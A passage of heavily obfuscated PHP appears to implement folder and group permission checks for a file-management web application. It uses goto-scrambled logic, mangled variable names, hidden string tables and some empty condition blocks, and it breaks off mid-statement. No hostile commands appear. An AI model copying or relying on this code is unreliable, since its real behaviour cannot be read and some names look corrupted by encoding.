<?php
 goto CÒ·Ä¿«ç…; dõñ™…“³: class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\x6f\165\162\143\145\137\141\165\x74\x68"; public function getAuth($C†Ìºéë¬Â) { goto eÓ¶ŠáÎ¸; eÓ¶ŠáÎ¸: $F‹Ø¨„¯„ï =& $_SERVER[í…¶]; $AŠŠï¶ = $F‹Ø¨„¯„ï[2250]; $c·Ø‹çŞòõ = array($F‹Ø¨„¯„ï[378] => $C†Ìºéë¬Â); goto d§¨ÎÉ¾›‡; A•‰èŠÌˆÍ: return $A÷ÄáÎ“; goto Eğ‹Œ›’Ÿ; d§¨ÎÉ¾›‡: $Fâ‡ôÚÁä = $this->field($AŠŠï¶)->order($F‹Ø¨„¯„ï[376])->where($c·Ø‹çŞòõ)->select(); $A÷ÄáÎ“ = array(); foreach ($Fâ‡ôÚÁä as $dœ‚²äõë) { if (Model($F‹Ø¨„¯„ï[2251])->listData($dœ‚²äõë[$F‹Ø¨„¯„ï[2232]])) { $A÷ÄáÎ“[] = $dœ‚²äõë; } } goto A•‰èŠÌˆÍ; Eğ‹Œ›’Ÿ: } public function setAuth($D‚àéùµ…è, $B£‰ƒÉˆÜ) { goto D­ˆÃ††°; D­ˆÃ††°: $còõƒ³² œ =& $_SERVER[í…¶]; $BÚéä ÄÒ = Model($còõƒ³² œ[1115])->sourceInfo($D‚àéùµ…è); if ($BÚéä ÄÒ[$còõƒ³² œ[380]] != SourceModel::TYPE_GROUP) { return !1; } goto EÀÌ‹¹½´ö; FÆÒÃœ•¸‚: $this->where(array($còõƒ³² œ[392] => $D‚àéùµ…è))->delete(); $this->addAll($bêÑ¨ù« Ê); return !0; goto e¤ÀÀèÃÇí; fÎ·ê„‹ƒø: $Dµ®®ñä…õ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $bêÑ¨ù« Ê = array(); foreach ($B£‰ƒÉˆÜ as $F÷¯ïòÀƒ) { if (!in_array($F÷¯ïòÀƒ[$còõƒ³² œ[380]], $Dµ®®ñä…õ)) { show_json(LNG($còõƒ³² œ[2252]), !1); } if ($cÚ£áèµ„– != $A”òİ®½Ùñ) { if ($F÷¯ïòÀƒ[$còõƒ³² œ[380]] == SourceModel::TYPE_GROUP) { } if ($F÷¯ïòÀƒ[$còõƒ³² œ[465]] != 0 && !in_array($F÷¯ïòÀƒ[$còõƒ³² œ[465]], $cÍ»¯Ÿ…ñ)) { } } if ($F÷¯ïòÀƒ[$còõƒ³² œ[465]] == 0) { $F÷¯ïòÀƒ[$còõƒ³² œ[380]] = SourceModel::TYPE_USER; } $bêÑ¨ù« Ê[] = array($còõƒ³² œ[378] => $D‚àéùµ…è, $còõƒ³² œ[380] => intval($F÷¯ïòÀƒ[$còõƒ³² œ[380]]), $còõƒ³² œ[465] => intval($F÷¯ïòÀƒ[$còõƒ³² œ[465]]), $còõƒ³² œ[2232] => intval($F÷¯ïòÀƒ[$còõƒ³² œ[2232]]) ? intval($F÷¯ïòÀƒ[$còõƒ³² œ[2232]]) : 0, $còõƒ³² œ[2233] => intval($F÷¯ïòÀƒ[$còõƒ³² œ[2233]]) ? intval($F÷¯ïòÀƒ[$còõƒ³² œ[2233]]) : -1); } goto FÆÒÃœ•¸‚; EÀÌ‹¹½´ö: $A”òİ®½Ùñ = 1; $cÚ£áèµ„– = $BÚéä ÄÒ[$còõƒ³² œ[465]]; if ($cÚ£áèµ„– != $A”òİ®½Ùñ) { $F¤Ø¯Ãª§ = array($còõƒ³² œ[2101] => $cÚ£áèµ„–); $cÍ»¯Ÿ…ñ = Model($còõƒ³² œ[2177])->field($còõƒ³² œ[1433])->where($F¤Ø¯Ãª§)->select(); $cÍ»¯Ÿ…ñ = array_to_keyvalue($cÍ»¯Ÿ…ñ, $còõƒ³² œ[33], $còõƒ³² œ[1433]); } goto fÎ·ê„‹ƒø; e¤ÀÀèÃÇí: } public function authClear($FÁ›ÚäÑîÅ) { $FÃùêùÇŸ =& $_SERVER[í…¶]; $fÁ¿­™ÑĞç = Model($FÃùêùÇŸ[1115])->sourceInfo($FÁ›ÚäÑîÅ); $a½ÜÄƒİª = array($FÁ›ÚäÑîÅ); if ($fÁ¿­™ÑĞç[$FÃùêùÇŸ[379]] == $FÃùêùÇŸ[83]) { $EÛÚš¥½ = array($FÃùêùÇŸ[534] => array($FÃùêùÇŸ[492], $fÁ¿­™ÑĞç[$FÃùêùÇŸ[468]] . $FÁ›ÚäÑîÅ . $FÃùêùÇŸ[493])); $a½ÜÄƒİª = Model($FÃùêùÇŸ[1115])->field($FÃùêùÇŸ[392])->where($EÛÚš¥½)->getField($FÃùêùÇŸ[378], !0); $a½ÜÄƒİª[] = $FÁ›ÚäÑîÅ; } $this->where(array($FÃùêùÇŸ[392] => array($FÃùêùÇŸ[393], $a½ÜÄƒİª)))->delete(); return !0; } public function get($CìÔõ¾³ š) { $BøÙâéõ‡ = $this->getSourceList(array($CìÔõ¾³ š), !0); return $BøÙâéõ‡[0]; } public function getSourceList($Aƒ‚Ìİë‰†, $B¹Û‘ß¬ñá = false) { goto C„¦„êø¶¾; C„¦„êø¶¾: $E—µùğíº =& $_SERVER[í…¶]; if (!$Aƒ‚Ìİë‰†) { return array(); } $d²•àç™‡  = Model($E—µùğíº[1115]); goto Dìµ¾®¶İ¿; eñÆéËê‰‹: $eÚ™ÇŸ„Òİ = array_values(array_unique($eÚ™ÇŸ„Òİ)); if (!$eÚ™ÇŸ„Òİ) { return array(); } $E“§ò¡“—§ = $E—µùğíº[2254]; goto a¥ÈºêßŸˆ; aÖñ¢ù‹„Ì: $BÅÑ…Î›¸ = array(); foreach ($B¹Û‘ß¬ñá as $bÅ¬¡Ú¾ª => $b”ºå‘„Åö) { $BÅÑ…Î›¸[$bÅ¬¡Ú¾ª] = $this->makeSourceAuth($b”ºå‘„Åö, $C–¾ëÊ‘†°); } return $BÅÑ…Î›¸; goto dÛÏñÍ¯«; Dìµ¾®¶İ¿: if (!$B¹Û‘ß¬ñá) { $DºöáÂ’‹ = array($E—µùğíº[392] => array($E—µùğíº[393], $Aƒ‚Ìİë‰†)); $B¹Û‘ß¬ñá = $d²•àç™‡ ->field($E—µùğíº[2253])->where($DºöáÂ’‹)->select(); $B¹Û‘ß¬ñá = array_to_keyvalue($B¹Û‘ß¬ñá, $E—µùğíº[378]); } $eÚ™ÇŸ„Òİ = $Aƒ‚Ìİë‰†; foreach ($B¹Û‘ß¬ñá as $e´ô­‡‘ => $E²¥°˜÷™Ò) { $b–İƒÇç“Ç = $d²•àç™‡ ->parentLevelArray($E²¥°˜÷™Ò[$E—µùğíº[468]]); $eÚ™ÇŸ„Òİ = array_merge($eÚ™ÇŸ„Òİ, $b–İƒÇç“Ç, array($e´ô­‡‘)); } goto eñÆéËê‰‹; a¥ÈºêßŸˆ: $DºöáÂ’‹ = array($E—µùğíº[392] => array($E—µùğíº[393], $eÚ™ÇŸ„Òİ)); $C–¾ëÊ‘†° = $this->field($E“§ò¡“—§)->where($DºöáÂ’‹)->select(); $C–¾ëÊ‘†° = array_to_keyvalue_group($C–¾ëÊ‘†°, $E—µùğíº[378]); goto aÖñ¢ù‹„Ì; dÛÏñÍ¯«: } public function authDeepCheck($C…àØÍ°©Ÿ) { goto D›ÓÏÍÄ; BÕ÷âº²æ¸: if (!in_array($C…àØÍ°©Ÿ, $eè´½çíß†[$BŸÇĞğà§[2255]])) { return !1; } $FÉç²áéÂÕ = array(); foreach ($eè´½çíß†[$BŸÇĞğà§[2256]] as $fŠ˜ÏÃÖº => $eÒ¿´ÊÊ„œ) { if (!in_array($C…àØÍ°©Ÿ, $eÒ¿´ÊÊ„œ)) { continue; } $FÉç²áéÂÕ[] = $fŠ˜ÏÃÖº; } goto BÊˆâŸå‚×; D›ÓÏÍÄ: $BŸÇĞğà§ =& $_SERVER[í…¶]; if (_get($GLOBALS, $BŸÇĞğà§[466])) { return !1; } $eè´½çíß† = $this->makeAuthDeep(); goto BÕ÷âº²æ¸; BÊˆâŸå‚×: $dÒñ„ç¹•Ù = $FÉç²áéÂÕ ? $FÉç²áéÂÕ[0] : $C…àØÍ°©Ÿ; return array($BŸÇĞğà§[386] => -1, $BŸÇĞğà§[427] => array($BŸÇĞğà§[394] => $BŸÇĞğà§[1029], $BŸÇĞğà§[2107] => $BŸÇĞğà§[477], $BŸÇĞğà§[395] => LNG($BŸÇĞğà§[2257]), $BŸÇĞğà§[2119] => $BŸÇĞğà§[2258]), $BŸÇĞğà§[2259] => array($BŸÇĞğà§[397] => $BŸÇĞğà§[2260], $BŸÇĞğà§[75] => $dÒñ„ç¹•Ù)); goto D¿À‹‘÷Û±; D¿À‹‘÷Û±: } protected function makeAuthDeep() { goto EœÛìÌ•‹à; cĞê–æ§—Š: $DîàòÊ¢ÜØ = Session::get($eíÆ´á†ì[2216]); $DîàòÊ¢ÜØ = array_to_keyvalue($DîàòÊ¢ÜØ, $eíÆ´á†ì[33], $eíÆ´á†ì[2101]); $AöÎ‚Í‡ = array($eíÆ´á†ì[380] => SourceModel::TYPE_USER, $eíÆ´á†ì[465] => USER_ID); goto D÷ÎöœŸªì; E‡”ô÷Š§ß: $EÊ¾ãîÙ¥– = array(); $a¼•†ÂŒ = array(); $CÅÌÖé ×¿ = array(); goto eƒæ–…ßòº; eƒæ–…ßòº: if ($fóè…¹°Ü†) { $bëòÕï = $F¼Ï£Ï•Š->where(array($eíÆ´á†ì[378] => array($eíÆ´á†ì[393], $fóè…¹°Ü†)))->select(); foreach ($bëòÕï as $D˜îë¢œ…¦) { $E÷­¿Ì„™ = $F¼Ï£Ï•Š->parentLevelArray($D˜îë¢œ…¦[$eíÆ´á†ì[468]]); $F‡À‚ùˆÂ¦ = array_merge($F‡À‚ùˆÂ¦, $E÷­¿Ì„™); $eó«¥ôï„œ[] = $D˜îë¢œ…¦[$eíÆ´á†ì[465]]; $D“Ú–ñ¿[$D˜îë¢œ…¦[$eíÆ´á†ì[378]]] = $E÷­¿Ì„™; $EÊ¾ãîÙ¥–[$D˜îë¢œ…¦[$eíÆ´á†ì[378]]] = $D˜îë¢œ…¦[$eíÆ´á†ì[465]]; } } $eó«¥ôï„œ = array_values(array_unique($eó«¥ôï„œ)); $eâùÍ‚ó¶ = $eó«¥ôï„œ; goto Dí–¼Îñğ; Fè‡›Àé‘ò: foreach ($D“Ú–ñ¿ as $aö´ÃÒ÷Ö => $dšî¸½ªŞŠ) { $eÂ÷ïí‡»¼ = $EÊ¾ãîÙ¥–[$aö´ÃÒ÷Ö]; if (!$eÂ÷ïí‡»¼ || !$a¼•†ÂŒ[$eÂ÷ïí‡»¼]) { continue; } $F·Ôùè‰Ï™ = array(); foreach ($CÅÌÖé ×¿[$eÂ÷ïí‡»¼] as $c¬¶À‚¤Ï¢) { $F·Ôùè‰Ï™[] = $a¼•†ÂŒ[$c¬¶À‚¤Ï¢]; } $D“Ú–ñ¿[$aö´ÃÒ÷Ö] = array_merge($F·Ôùè‰Ï™, $dšî¸½ªŞŠ); } $F‡À‚ùˆÂ¦ = array_values(array_unique($F‡À‚ùˆÂ¦)); $e«‡å«¾Ñ = array($eíÆ´á†ì[2255] => $F‡À‚ùˆÂ¦, $eíÆ´á†ì[2256] => $D“Ú–ñ¿); goto Då—”¸‹”‰; c‹£ĞäÚÎÊ: $F¼Ï£Ï•Š = Model($eíÆ´á†ì[1115]); $B«ºêã—Ìñ = Model($eíÆ´á†ì[467]); $D“Ú–ñ¿ = array(); goto E‡”ô÷Š§ß; EœÛìÌ•‹à: $eíÆ´á†ì =& $_SERVER[í…¶]; static $e«‡å«¾Ñ = false; if ($e«‡å«¾Ñ) { return $e«‡å«¾Ñ; } goto bš®‹º©Âª; D÷ÎöœŸªì: if ($DîàòÊ¢ÜØ) { $AöÎ‚Í‡ = array(array($eíÆ´á†ì[380] => SourceModel::TYPE_USER, $eíÆ´á†ì[465] => USER_ID), array($eíÆ´á†ì[380] => SourceModel::TYPE_GROUP, $eíÆ´á†ì[465] => array($eíÆ´á†ì[393], $DîàòÊ¢ÜØ)), $eíÆ´á†ì[912] => $eíÆ´á†ì[2183]); } if ($f³…ã¾Ÿ×») { $AöÎ‚Í‡ = array($AöÎ‚Í‡, $eíÆ´á†ì[2232] => array($eíÆ´á†ì[2262], $f³…ã¾Ÿ×»)); } $CÅã´ˆ»—â = $this->field($eíÆ´á†ì[2263])->where($AöÎ‚Í‡)->select(); goto EùÏÆÑ•«; bš®‹º©Âª: $døâŸ»Ã„— = Model($eíÆ´á†ì[2261])->listData(); $f³…ã¾Ÿ×» = array(); foreach ($døâŸ»Ã„— as $a¤™àòÂˆĞ) { if ($a¤™àòÂˆĞ[$eíÆ´á†ì[385]] == 0 && $a¤™àòÂˆĞ[$eíÆ´á†ì[2121]] == $eíÆ´á†ì[83]) { $f³…ã¾Ÿ×»[] = $a¤™àòÂˆĞ[$eíÆ´á†ì[376]]; } } goto cĞê–æ§—Š; Dí–¼Îñğ: foreach ($eâùÍ‚ó¶ as $c¬¶À‚¤Ï¢) { $Fƒ²¥É¢Î¸ = $B«ºêã—Ìñ->getInfo($c¬¶À‚¤Ï¢); $E÷­¿Ì„™ = $F¼Ï£Ï•Š->parentLevelArray($Fƒ²¥É¢Î¸[$eíÆ´á†ì[468]]); $eó«¥ôï„œ = array_merge($eó«¥ôï„œ, $E÷­¿Ì„™); } $eó«¥ôï„œ = array_values(array_unique($eó«¥ôï„œ)); foreach ($eó«¥ôï„œ as $c¬¶À‚¤Ï¢) { $Fƒ²¥É¢Î¸ = $B«ºêã—Ìñ->getInfo($c¬¶À‚¤Ï¢); $F‡À‚ùˆÂ¦[] = $Fƒ²¥É¢Î¸[$eíÆ´á†ì[400]][$eíÆ´á†ì[378]]; $a¼•†ÂŒ[$c¬¶À‚¤Ï¢] = $Fƒ²¥É¢Î¸[$eíÆ´á†ì[400]][$eíÆ´á†ì[378]]; $CÅÌÖé ×¿[$c¬¶À‚¤Ï¢] = $F¼Ï£Ï•Š->parentLevelArray($Fƒ²¥É¢Î¸[$eíÆ´á†ì[468]]); } goto Fè‡›Àé‘ò; Då—”¸‹”‰: return $e«‡å«¾Ñ; goto e‹Ãã¦É; EùÏÆÑ•«: $fóè…¹°Ü† = array_to_keyvalue($CÅã´ˆ»—â, $eíÆ´á†ì[33], $eíÆ´á†ì[378]); $F‡À‚ùˆÂ¦ = array(); $eó«¥ôï„œ = $DîàòÊ¢ÜØ; goto c‹£ĞäÚÎÊ; e‹Ãã¦É: } private function makeSourceAuth($CÉƒ—Ëñ´, $bœ¥­¿Ä) { goto Fó©íäÀÁí; AåÌìŸÆ‰: if (!$bÓ“ÓÉÂñ && isset($b…¤×Ñª»Ş[$C‚«Èñàª ])) { $cÁ†¶†Ó‰ = $b…¤×Ñª»Ş[$C‚«Èñàª ]; $Bùå†«Ã­¦ = Model($f«Œğ‡¸Á[467])->getInfo($C‚«Èñàª ); $bÓ“ÓÉÂñ = array($f«Œğ‡¸Á[2264] => intval($cÁ†¶†Ó‰[$f«Œğ‡¸Á[385]][$f«Œğ‡¸Á[385]]), $f«Œğ‡¸Á[2265] => $cÁ†¶†Ó‰[$f«Œğ‡¸Á[385]], $f«Œğ‡¸Á[2259] => array($f«Œğ‡¸Á[397] => $f«Œğ‡¸Á[2269], $f«Œğ‡¸Á[75] => $Bùå†«Ã­¦[$f«Œğ‡¸Á[400]][$f«Œğ‡¸Á[378]], $f«Œğ‡¸Á[2268] => $Bùå†«Ã­¦[$f«Œğ‡¸Á[472]])); } if (!$bÓ“ÓÉÂñ) { $Bùå†«Ã­¦ = Model($f«Œğ‡¸Á[467])->getInfo($C‚«Èñàª ); $fÑëë„Ã¶Ô = explode($f«Œğ‡¸Á[47], trim($Bùå†«Ã­¦[$f«Œğ‡¸Á[468]], $f«Œğ‡¸Á[47])); foreach ($fÑëë„Ã¶Ô as $B·¸“†Òù) { if ($B·¸“†Òù == $f«Œğ‡¸Á[477] || $B·¸“†Òù == $Cƒª£¿òœ) { continue; } if (!isset($b…¤×Ñª»Ş[$B·¸“†Òù])) { continue; } $cÁ†¶†Ó‰ = $b…¤×Ñª»Ş[$B·¸“†Òù]; $bÓ“ÓÉÂñ = array($f«Œğ‡¸Á[2264] => intval($cÁ†¶†Ó‰[$f«Œğ‡¸Á[385]][$f«Œğ‡¸Á[385]]), $f«Œğ‡¸Á[2265] => $cÁ†¶†Ó‰[$f«Œğ‡¸Á[385]], $f«Œğ‡¸Á[2259] => array($f«Œğ‡¸Á[397] => $f«Œğ‡¸Á[2266], $f«Œğ‡¸Á[2267] => $Bùå†«Ã­¦[$f«Œğ‡¸Á[400]][$f«Œğ‡¸Á[378]], $f«Œğ‡¸Á[2268] => $Bùå†«Ã­¦[$f«Œğ‡¸Á[472]])); break; } } if (!$bÓ“ÓÉÂñ || $bÓ“ÓÉÂñ[$f«Œğ‡¸Á[386]] <= 0) { $C¿ÆÊèˆçœ = $this->authDeepCheck($CÉƒ—Ëñ´[$f«Œğ‡¸Á[378]]); if ($C¿ÆÊèˆçœ) { $bÓ“ÓÉÂñ = $C¿ÆÊèˆçœ; } } goto Eèß‘ïŞø; Fó©íäÀÁí: $f«Œğ‡¸Á =& $_SERVER[í…¶]; $b…¤×Ñª»Ş = Session::get($f«Œğ‡¸Á[2216]); $b…¤×Ñª»Ş = array_to_keyvalue($b…¤×Ñª»Ş, $f«Œğ‡¸Á[2101]); goto C®‰­ÚŒ‹; B½…ãì­Àâ: $C‚«Èñàª  = $CÉƒ—Ëñ´[$f«Œğ‡¸Á[465]]; $B²™Ú©Ó¢é = $CÉƒ—Ëñ´[$f«Œğ‡¸Á[380]] == SourceModel::TYPE_GROUP; if ($B²™Ú©Ó¢é && isset($b…¤×Ñª»Ş[$C‚«Èñàª ]) && !_get($GLOBALS, $f«Œğ‡¸Á[466])) { $cÁ†¶†Ó‰ = $b…¤×Ñª»Ş[$C‚«Èñàª ]; if (Model($f«Œğ‡¸Á[2251])->authCheckRoot($cÁ†¶†Ó‰[$f«Œğ‡¸Á[385]][$f«Œğ‡¸Á[385]])) { $Bùå†«Ã­¦ = Model($f«Œğ‡¸Á[467])->getInfo($C‚«Èñàª ); $bÓ“ÓÉÂñ = array($f«Œğ‡¸Á[2264] => intval($cÁ†¶†Ó‰[$f«Œğ‡¸Á[385]][$f«Œğ‡¸Á[385]]), $f«Œğ‡¸Á[2265] => $cÁ†¶†Ó‰[$f«Œğ‡¸Á[385]], $f«Œğ‡¸Á[2259] => array($f«Œğ‡¸Á[397] => $f«Œğ‡¸Á[2266], $f«Œğ‡¸Á[2267] => $Bùå†«Ã­¦[$f«Œğ‡¸Á[400]][$f«Œğ‡¸Á[378]], $f«Œğ‡¸Á[2268] => $Bùå†«Ã­¦[$f«Œğ‡¸Á[472]])); return $bÓ“ÓÉÂñ; } } goto DÅ‹’Ùˆ¾‡; DÅ‹’Ùˆ¾‡: $bÓ“ÓÉÂñ = !1; foreach ($EÀéù¥ä¹ as $e§“Ï¾ ß…) { if (!isset($bœ¥­¿Ä[$e§“Ï¾ ß…])) { continue; } $cğôöÓéß¦ = $this->authMake($bœ¥­¿Ä[$e§“Ï¾ ß…]); if ($cğôöÓéß¦[$f«Œğ‡¸Á[427]]) { $bÓ“ÓÉÂñ = $cğôöÓéß¦; break; } } if (!$B²™Ú©Ó¢é) { return $bÓ“ÓÉÂñ; } goto AåÌìŸÆ‰; C®‰­ÚŒ‹: $Cƒª£¿òœ = $f«Œğ‡¸Á[83]; $EÀéù¥ä¹ = Model($f«Œğ‡¸Á[1115])->parentLevelArray($CÉƒ—Ëñ´[$f«Œğ‡¸Á[468]]); $EÀéù¥ä¹ = array_merge(array($CÉƒ—Ëñ´[$f«Œğ‡¸Á[378]]), array_reverse($EÀéù¥ä¹)); goto B½…ãì­Àâ; Eèß‘ïŞø: return $bÓ“ÓÉÂñ; goto BÉİ¨¹¡à–; BÉİ¨¹¡à–: } public function authOwnerApply($aÈ–ŸÃ×³‘) { goto Bá¶óÛÂÁ; Bá¶óÛÂÁ: $A›˜Ô¡‚‘õ =& $_SERVER[í…¶]; if (empty($aÈ–ŸÃ×³‘[$A›˜Ô¡‚‘õ[385]]) || isset($aÈ–ŸÃ×³‘[$A›˜Ô¡‚‘õ[2270]]) && $aÈ–ŸÃ×³‘[$A›˜Ô¡‚‘õ[2270]]) { return $aÈ–ŸÃ×³‘; } if (AuthModel::authCheckRoot($aÈ–ŸÃ×³‘[$A›˜Ô¡‚‘õ[385]][$A›˜Ô¡‚‘õ[386]])) { return $aÈ–ŸÃ×³‘; } goto c¹¢ÅØ®¾¾; a‡½ÏéâŠ†: if (count($aÈ‹ÅÖáÕÓ) == 0) { $aÈ‹ÅÖáÕÓ = $this->authFolderOwnerGroup($aÈ–ŸÃ×³‘[$A›˜Ô¡‚‘õ[465]]); } $aÈ‹ÅÖáÕÓ = array_unique($aÈ‹ÅÖáÕÓ); if (AuthModel::authCheckRoot($aÈ–ŸÃ×³‘[$A›˜Ô¡‚‘õ[385]][$A›˜Ô¡‚‘õ[386]])) { $aÈ‹ÅÖáÕÓ[] = USER_ID; } goto dè‡ê¬…°â; c¹¢ÅØ®¾¾: $cÈ¡Ñ¾­ŠÖ = Model($A›˜Ô¡‚‘õ[1115])->parentLevelArray($aÈ–ŸÃ×³‘[$A›˜Ô¡‚‘õ[468]]); $cÈ¡Ñ¾­ŠÖ = array_merge(array($aÈ–ŸÃ×³‘[$A›˜Ô¡‚‘õ[378]]), array_reverse($cÈ¡Ñ¾­ŠÖ)); $E¬Ì¿Ğò•ò = $A›˜Ô¡‚‘õ[2254]; goto F©ÖŠÍºä; dè‡ê¬…°â: $aÈ–ŸÃ×³‘[$A›˜Ô¡‚‘õ[385]][$A›˜Ô¡‚‘õ[2272]] = Model($A›˜Ô¡‚‘õ[483])->userListInfo($aÈ‹ÅÖáÕÓ); return $aÈ–ŸÃ×³‘; goto F˜ÉÁ®˜Úì; F©ÖŠÍºä: $F”øõ­Êµç = array($A›˜Ô¡‚‘õ[392] => array($A›˜Ô¡‚‘õ[393], $cÈ¡Ñ¾­ŠÖ)); $bã»›¬ŸÔ¥ = $this->field($E¬Ì¿Ğò•ò)->where($F”øõ­Êµç)->select(); $bã»›¬ŸÔ¥ = array_to_keyvalue_group($bã»›¬ŸÔ¥, $A›˜Ô¡‚‘õ[378]); goto f©´æ‹ø©; f©´æ‹ø©: $d¼•Ä¶é¡´ = array(); $aÈ‹ÅÖáÕÓ = array(); foreach ($bã»›¬ŸÔ¥ as $dÑÙ³·¬Á† => $Fâ’ËÛÕ¾) { $C±ã®Ó‘¢‡ = $this->authFolderOwnerUser($Fâ’ËÛÕ¾); $d¼•Ä¶é¡´[$dÑÙ³·¬Á†] = $C±ã®Ó‘¢‡; $aÈ‹ÅÖáÕÓ = array_merge($aÈ‹ÅÖáÕÓ, $C±ã®Ó‘¢‡[$A›˜Ô¡‚‘õ[544]]); if ($C±ã®Ó‘¢‡[$A›˜Ô¡‚‘õ[2271]]) { break; } } goto a‡½ÏéâŠ†; F˜ÉÁ®˜Úì: } private function authFolderOwnerGroup($fç¦Ü½é¶‰) { $E‹òùåí“ê =& $_SERVER[í…¶]; $FŸŸ†º„Òë = Model($E‹òùåí“ê[2177])->where(array($E‹òùåí“ê[2101] => $fç¦Ü½é¶‰))->select(); $eª——èì‡ = array(); if (!$FŸŸ†º„Òë) { return $eª——èì‡; } foreach ($FŸŸ†º„Òë as $dÊ–Í‰æÛÏ) { $a¸Õš¸ˆÜô = $this->authInfo($dÊ–Í‰æÛÏ); if (AuthModel::authCheckRoot($a¸Õš¸ˆÜô[$E‹òùåí“ê[385]])) { $eª——èì‡[] = $dÊ–Í‰æÛÏ[$E‹òùåí“ê[1433]]; } } return $eª——èì‡; } private function authFolderOwnerUser($bÜğß¥äğ‰) { $bğ×«å‡ÖÕ =& $_SERVER[í…¶]; $fòß°°é¿ = array(); $bªëÃÄšŞ = !1; foreach ($bÜğß¥äğ‰ as $d£ŞË×…àÈ) { $fÄ›˜¢Ëğ· = $this->authInfo($d£ŞË×…àÈ); if ($d£ŞË×…àÈ[$bğ×«å‡ÖÕ[465]] == $bğ×«å‡ÖÕ[477]) { $bªëÃÄšŞ = !0; } if ($d£ŞË×…àÈ[$bğ×«å‡ÖÕ[380]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($fÄ›˜¢Ëğ·[$bğ×«å‡ÖÕ[385]])) { $fòß°°é¿[] = $d£ŞË×…àÈ[$bğ×«å‡ÖÕ[465]]; } } } return array($bğ×«å‡ÖÕ[544] => $fòß°°é¿, $bğ×«å‡ÖÕ[2271] => $bªëÃÄšŞ); } public function authMake($bíæ‘ÈƒÄ) { goto cç–Í™‹ìÄ; cç–Í™‹ìÄ: $CÕÓÕÒšˆ =& $_SERVER[í…¶]; if (!$bíæ‘ÈƒÄ) { return array($CÕÓÕÒšˆ[386] => 0, $CÕÓÕÒšˆ[427] => !1); } $aâ„¡‡Â“ö = Session::get($CÕÓÕÒšˆ[2216]); goto B·¢ôßáë; B·¢ôßáë: $bŸ¼ø¯‡ï = array_to_keyvalue($aâ„¡‡Â“ö, $CÕÓÕÒšˆ[33], $CÕÓÕÒšˆ[2101]); $Dƒ»Ñ‘æù = 0; $Aöëêè” = 0; goto fƒ­÷‚ä…Ä; fÇŞ¤··Ê: $Eå‡¼íŸÂÛ = $F·‘¨É•‹Ù ? $Dƒ»Ñ‘æù : ($d©“ÆÈ¦† ? $Aöëêè” : $bµÂˆä¶í); $dœÏ ÄÉ = $F·‘¨É•‹Ù ? $bÊ¦ÖÚê¬ : ($d©“ÆÈ¦† ? $BÖĞ¾ºˆ‡ : $Bè¹ŠÏÄèœ); $aìùß Ñ¦Œ = $F·‘¨É•‹Ù ? $CÕÓÕÒšˆ[2273] : ($d©“ÆÈ¦† ? $CÕÓÕÒšˆ[2274] : ($F÷Êë½ì¯ ? $CÕÓÕÒšˆ[2275] : $CÕÓÕÒšˆ[370])); goto Cøœš÷—ÔÅ; f±î¹øîµ: $F÷Êë½ì¯ = 0; $F»ãç«›² = array($CÕÓÕÒšˆ[378] => 0); foreach ($bíæ‘ÈƒÄ as $F»ãç«›²) { $dœÏ ÄÉ = $this->authInfo($F»ãç«›²); $B•Ë—ƒ—Ç¹ = $F»ãç«›²[$CÕÓÕÒšˆ[465]]; $eº œÌ‘¡ = intval($dœÏ ÄÉ[$CÕÓÕÒšˆ[385]]); if ($F»ãç«›²[$CÕÓÕÒšˆ[380]] == SourceModel::TYPE_USER && $B•Ë—ƒ—Ç¹ == USER_ID) { $F·‘¨É•‹Ù = !0; $bÊ¦ÖÚê¬ = $dœÏ ÄÉ; $Dƒ»Ñ‘æù = $eº œÌ‘¡; } else { if ($F»ãç«›²[$CÕÓÕÒšˆ[380]] == SourceModel::TYPE_GROUP && in_array($B•Ë—ƒ—Ç¹, $bŸ¼ø¯‡ï)) { $d©“ÆÈ¦† = !0; if ($eº œÌ‘¡ >= $Aöëêè”) { $Aöëêè” = $eº œÌ‘¡; $BÖĞ¾ºˆ‡ = $dœÏ ÄÉ; } } else { if ($B•Ë—ƒ—Ç¹ == $CÕÓÕÒšˆ[477]) { $F÷Êë½ì¯ = !0; $Bè¹ŠÏÄèœ = $dœÏ ÄÉ; $bµÂˆä¶í = $eº œÌ‘¡; } } } } goto fÇŞ¤··Ê; Cøœš÷—ÔÅ: $F…æó‚šãÖ = array($CÕÓÕÒšˆ[2264] => intval($Eå‡¼íŸÂÛ), $CÕÓÕÒšˆ[2265] => $dœÏ ÄÉ, $CÕÓÕÒšˆ[2259] => array($CÕÓÕÒšˆ[397] => $aìùß Ñ¦Œ, $CÕÓÕÒšˆ[75] => $F»ãç«›²[$CÕÓÕÒšˆ[378]])); return $F…æó‚šãÖ; goto C¼Š­–Íäµ; fƒ­÷‚ä…Ä: $bµÂˆä¶í = 0; $bÊ¦ÖÚê¬ = 0; $BÖĞ¾ºˆ‡ = 0; goto C¤÷™Œˆª°; C¤÷™Œˆª°: $Bè¹ŠÏÄèœ = 0; $F·‘¨É•‹Ù = 0; $d©“ÆÈ¦† = 0; goto f±î¹øîµ; C¼Š­–Íäµ: } public function authTargetInfoMake($e•¼ç¸àøÈ) { goto aÍìÒÙŠ¿‹; aÍìÒÙŠ¿‹: $E©Ú÷Ä”„ =& $_SERVER[í…¶]; $c¼ˆ”¼öÒÛ = array(); $aˆÖÆ–é°Ó = array(); goto cö”ÍÔ„; bå¸®³ª·¬: return array($E©Ú÷Ä”„[2276] => $c¼ˆ”¼öÒÛ, $E©Ú÷Ä”„[2268] => $aˆÖÆ–é°Ó); goto EÔìõÜ™Ö…; cö”ÍÔ„: foreach ($e•¼ç¸àøÈ as $C°¹ôæ¼¨ê) { if ($C°¹ôæ¼¨ê[$E©Ú÷Ä”„[380]] == SourceModel::TYPE_USER) { $c¼ˆ”¼öÒÛ[] = intval($C°¹ôæ¼¨ê[$E©Ú÷Ä”„[465]]); } else { if ($C°¹ôæ¼¨ê[$E©Ú÷Ä”„[380]] == SourceModel::TYPE_GROUP) { $aˆÖÆ–é°Ó[] = intval($C°¹ôæ¼¨ê[$E©Ú÷Ä”„[465]]); } } } if ($c¼ˆ”¼öÒÛ) { $c¼ˆ”¼öÒÛ = Model($E©Ú÷Ä”„[483])->userListInfo($c¼ˆ”¼öÒÛ); } if ($aˆÖÆ–é°Ó) { $E·…Ôˆ‡õè = array($E©Ú÷Ä”„[2175] => array($E©Ú÷Ä”„[393], $aˆÖÆ–é°Ó)); $aˆÖÆ–é°Ó = Model($E©Ú÷Ä”„[467])->field($E©Ú÷Ä”„[2188])->where($E·…Ôˆ‡õè)->select(); $aˆÖÆ–é°Ó = 